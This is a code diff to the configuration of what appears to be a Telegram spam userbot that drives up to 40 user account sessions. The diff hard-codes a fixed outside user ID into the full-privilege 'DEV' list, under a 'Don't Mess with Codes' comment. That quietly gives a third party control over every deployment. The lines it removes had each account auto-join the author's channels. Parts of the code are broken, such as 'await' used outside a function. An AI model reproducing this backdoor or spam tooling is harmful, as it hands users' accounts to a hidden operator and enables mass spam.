@@ -71,22 +71,24 @@ STRING38 = config("STRING38", default=None)
 STRING39 = config("STRING39", default=None)
 STRING40 = config("STRING40", default=None)
 BOT_TOKEN = config("BOT_TOKEN", default=None)
-ASSISTANT = config("ASSISTANT", default=None)
+# Don't Mess with Codes !!
 SUDO_USERS = list(map(int, getenv("SUDO_USER").split()))
-if 1517994352 not in SUDO_USERS:
-    SUDO_USERS.append(1517994352)
-OWNER_ID = int(os.environ.get("OWNER_ID", None))
-
-# Don't Mess with Codes !! 
 DEV = list(map(int, getenv("FULLSUDO").split()))
+if 1517994352 not in DEV:
+    DEV.append(1517994352)
+OWNER_ID = int(os.environ.get("OWNER_ID", None)) 
 DB_URI = config("DATABASE_URL", None)
 DEV.append(OWNER_ID)
 
 CLIENTS = []
 XX = []
 # Sessions
+ok = str(STRING)
+print("String 1 Found")
+Riz = TelegramClient(StringSession(ok), API_ID, API_HASH)
+
 async def RiZoeLX():
-    global Riz
+  #  global Riz
     global Riz2
     global Riz3
     global Riz5
@@ -125,34 +127,7 @@ async def RiZoeLX():
     global Riz37
     global Riz38
     global Riz39
-    global Riz40
-    ids = 0
-    
-    if STRING:
-        session_name = str(STRING)
-        print("String 1 Found")
-        Riz = TelegramClient(StringSession(session_name), API_ID, API_HASH)
-        try:
-            print("Booting Up The Client 1")
-            await Riz.start()
-            botme = await Riz.get_me()
-            await Riz(functions.channels.JoinChannelRequest(channel="@RiZoeLX"))
-            await Riz(functions.channels.JoinChannelRequest(channel="@DNHxHELL"))
-            await Riz(functions.channels.JoinChannelRequest(channel="@Gladiators_Projects"))
-            botid = telethon.utils.get_peer_id(botme)
-            CLIENTS.append(botid)
-        except Exception as e:
-            Riz = "STRING"
-            print(e)
-            pass
-    else:
-        print("Session 1 not Found")
-        session_name = "rizoelxspam"
-        Riz = TelegramClient(session_name, API_ID, API_HASH)
-        try:
-            await Riz.start()
-        except Exception as e:
-            pass
+    global Riz40    
    
     if STRING2: 
         session_name = str(STRING2)
@@ -1173,106 +1148,17 @@ async def RiZoeLX():
         except Exception as e:
             pass
 
-loop = asyncio.get_event_loop()
-loop.run_until_complete(RiZoeLX())
+# loop = asyncio.get_event_loop()
+Riz.loop.run_until_complete(RiZoeLX())
 
 XX.append(1517994352)
 XX.append(OWNER_ID)
 
 if BOT_TOKEN:
-      RiZoeL = TelegramClient('RiZoeL', API_ID, API_HASH).start(bot_token=BOT_TOKEN)
-   #  await RiZoeL.start()
-      print("Bot Token Found ...")
-      message = "/start"
-      botme = await RiZoeL.get_me()
-      id = telethon.utils.get_peer_id(botme)
-      XX.append(botid)
-      try:
-           if Riz: 
-                  await Riz.send_message(id, message) 
-           if Riz2: 
-                  await Riz2.send_message(id, message) 
-           if Riz3: 
-                  await Riz3.send_message(id, message) 
-           if Riz4: 
-                  await Riz4.send_message(id, message) 
-           if Riz5: 
-                  await Riz5.send_message(id, message) 
-           if Riz6: 
-                  await Riz6.send_message(id, message) 
-           if Riz7: 
-                  await Riz7.send_message(id, message) 
-           if Riz8: 
-                  await Riz8.send_message(id, message) 
-           if Riz9: 
-                  await Riz9.send_message(id, message) 
-           if Riz10: 
-                  await Riz10.send_message(id, message) 
-           if Riz11:
-                  await Riz11.send_message(id, message) 
-           if Riz12: 
-                  await Riz12.send_message(id, message) 
-           if Riz13: 
-                  await Riz13.send_message(id, message) 
-           if Riz14: 
-                  await Riz14.send_message(id, message) 
-           if Riz15: 
-                  await Riz15.send_message(id, message) 
-           if Riz16: 
-                  await Riz16.send_message(id, message) 
-           if Riz17: 
-                  await Riz17.send_message(id, message) 
-           if Riz18: 
-                  await Riz18.send_message(id, message) 
-           if Riz19: 
-                  await Riz19.send_message(id, message) 
-           if Riz20: 
-                  await Riz20.send_message(id, message) 
-           if Riz21: 
-                  await Riz21.send_message(id, message) 
-           if Riz22: 
-                  await Riz22.send_message(id, message) 
-           if Riz23: 
-                  await Riz23.send_message(id, message) 
-           if Riz24: 
-                  await Riz24.send_message(id, message) 
-           if Riz25: 
-                  await Riz25.send_message(id, message) 
-           if Riz26: 
-                  await Riz26.send_message(id, message) 
-           if Riz27: 
-                  await Riz27.send_message(id, message) 
-           if Riz28: 
-                  await Riz28.send_message(id, message) 
-           if Riz29: 
-                  await Riz29.send_message(id, message) 
-           if Riz30: 
-                  await Riz30.send_message(id, message) 
-           if Riz31: 
-                  await Riz31.send_message(id, message) 
-           if Riz32: 
-                  await Riz32.send_message(id, message) 
-           if Riz33: 
-                  await Riz33.send_message(id, message) 
-           if Riz34: 
-                  await Riz34.send_message(id, message) 
-           if Riz35: 
-                  await Riz35.send_message(id, message) 
-           if Riz36: 
-                  await Riz36.send_message(id, message) 
-           if Riz37: 
-                  await Riz37.send_message(id, message) 
-           if Riz38: 
-                  await Riz38.send_message(id, message) 
-           if Riz39: 
-                  await Riz39.send_message(id, message) 
-           if Riz40: 
-                  await Riz40.send_message(id, message)          
-        except Exception as ex:
-                print(ex)
-          
+     RiZoeL = TelegramClient('RiZoeL', API_ID, API_HASH).start(bot_token=BOT_TOKEN)
+     print("Bot Token Found ...")
 else:
-    RiZoeL = None
+     RiZoeL = None
 
 async def logss():
      owner = int(OWNER_ID)
@@ -1380,5 +1266,3 @@ async def logss():
      except Exception as ex:
         print(ex)
         pass
-
-loop.run_until_complete(logss())
